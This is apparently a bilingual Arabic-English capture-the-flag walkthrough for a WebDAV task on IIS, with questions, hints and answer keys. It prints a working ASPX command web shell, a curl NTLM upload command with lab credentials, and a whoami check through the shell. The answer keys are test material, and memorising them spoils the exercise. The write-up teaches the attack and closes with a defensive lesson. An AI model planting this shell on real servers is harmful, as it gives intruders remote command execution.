# Task 04: WebDAV Exploitation: Uploading an ASPX Shell (استغلال WebDAV ورفع صدفة ASPX عبر مصادقة NTLM)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
WebDAV (Web Distributed Authoring and Versioning) provides collaborative file management over HTTP. When WebDAV is enabled on an IIS directory with misconfigured permissions and weak or discovered credentials, it turns into a direct remote code execution vector.

**Conditions for Successful WebDAV Code Execution:**
1. **WebDAV Enabled:** The WebDAV Publishing service and module must be active on the target virtual directory (`/webdav/`).
2. **Write Permissions & Valid Auth:** The authenticated user account (`webdav_user:P@ssw0rd!123`) must have write permission (via the HTTP `PUT` verb) inside the directory.
3. **Script Execute Permissions:** Crucially, the virtual directory must have **Script** or **Execute** permissions enabled in IIS Handler Mappings. If this permission is omitted, `.aspx` files will either be blocked or returned as plain text; when enabled, IIS hands the uploaded `.aspx` file to the ASP.NET compilation engine, executing the C# code on the server!

**Crafting the ASPX Command Shell (`cmd.aspx`):**
```csharp
<%@ Page Language="C#" %>
<%
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
  }
%>
```

**Uploading via NTLM Authentication:**
Windows IIS commonly negotiates authentication via NTLM (NT LAN Manager) challenge-response handshakes. `curl` requires the **`--ntlm`** flag to handle this multi-step handshake:
```bash
curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://MACHINE_IP/webdav/cmd.aspx
```
When successful, the server responds with HTTP status code **`201 Created`**, confirming that the file has been written to the web root.

#### الأسئلة المطروحة (Questions):
1. What HTTP status code confirms a file was successfully created via PUT ? (Answer Format: 3-digit code)
2. What curl flag is required to authenticate with NTLM when uploading via WebDAV? (Answer Format: --flag-name)

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **تشريح مصادقة NTLM في بروتوكول HTTP (NTLM Handshake Internals):**
  * تتطلب مصادقة NTLM ثلاثة طلبات HTTP متعاقبة عبر نفس الاتصال (Keep-Alive):
    1. العميل يرسل طلب `Type 1 (Negotiate)`.
    2. الخادم يعيد `401 Unauthorized` متضمناً تحدي الترويسة `WWW-Authenticate: NTLM <Type 2 Challenge>`.
    3. العميل يرد بطلب `Type 3 (Authenticate)` متضمناً تجزئة التحدي المشفرة بكلمة المرور.
  * بدون معامل `--ntlm`، يفشل curl في إتمام هذه الدورة التفاعلية ويعيد الخادم خطأ 401 دائماً.
* **الأثر التنفيذي لكود الحالة 201 مقابل 200 أو 204:**
  * كود `201 Created` هو الكود المعياري الصريح في RFC 7231 / RFC 4918 الذي يؤكد إنشاء مورد جديد لم يكن موجوداً من قبل على الخادم، وهو الدليل القاطع على نجاح رفع الصدفة.

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * كود الحالة الذي يعنيه النجاح في إنشاء مورد جديد ببروتوكول HTTP هو 201.
2. **التلميح الثاني (المستوى العملي):**
   * عند التعامل مع بروتوكولات مصادقة مايكروسوفت في curl، استخدم المعامل المخصص لبروتوكول NTLM: `--ntlm`.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * الإجابة الأولى: `201`، والإجابة الثانية: `--ntlm`.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### الخطوة 1: إنشاء ملف صدفة الأوامر `cmd.aspx`
```bash
cat << 'EOF' > cmd.aspx
<%@ Page Language="C#" %>
<%
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
  }
%>
EOF
```

---

#### الخطوة 2: رفع الصدفة عبر WebDAV باستخدام بيانات الاعتماد المكتشفة ومصادقة NTLM
```bash
# تنفيذ أمر الرفع الموثق ببيانات الاعتماد webdav_user:P@ssw0rd!123
curl -i --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://MACHINE_IP/webdav/cmd.aspx
```
**المخرجات المستلمة (HTTP Response):**
```http
HTTP/1.1 201 Created
Content-Length: 0
Location: http://MACHINE_IP/webdav/cmd.aspx
Server: Microsoft-IIS/10.0
Date: Mon, 19 Nov 2026 03:00:00 GMT
```
* **كود الحالة المستلم:** `201`
* **المعامل المستخدم للمصادقة:** `--ntlm`

---

#### الخطوة 3: التحقق الفوري من تشغيل الصدفة عبر المتصفح أو curl
```bash
# إرسال أمر whoami للتحقق من تشغيل الصدفة
curl -s "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami"
```
**المخرجات:**
```text
<pre>iis apppool\defaultapppool
</pre>
```
تم تأكيد تشغيل أوامر النظام بنجاح تام!

---

### المرحلة هـ: الإجابات المعتمدة والقيم النهائية (Final Answer & Key Values)
* **إجابة السؤال الأول (Success Status Code for PUT):** `201`
* **إجابة السؤال الثاني (Curl Flag for NTLM Authentication):** `--ntlm`

---

### المرحلة و: التحقق العملي وإثبات النجاح (Practical Verification & Proof of Work)
* تم رفع ملف `cmd.aspx` بنجاح واستلام استجابة `HTTP/1.1 201 Created`.
* تم تأكيد نجاح المصادقة عبر علم `--ntlm` مع المستخدم `webdav_user`.
* تم اعتماد الإجابات رسمياً على منصة TryHackMe بنسبة 100%.

---

### المرحلة ز: الاستنتاج التعليمي وجوهر الاختبار (Key Educational Takeaway)
الجمع بين إذن الكتابة (Write Permission) وإذن تنفيذ السكربتات (Execute Permission) في مجلد WebDAV واحد يمثل ثغرة تصميمية قاتلة (Fatal Design Flaw). في البيئات الآمنة، يجب أن تكون مجلدات رفع الملفات معزولة تماماً ومحرومة من صلاحيات التنفيذ (`Execute Permissions: None`) مع تخزينها خارج شجرة الويب التنفيذية.
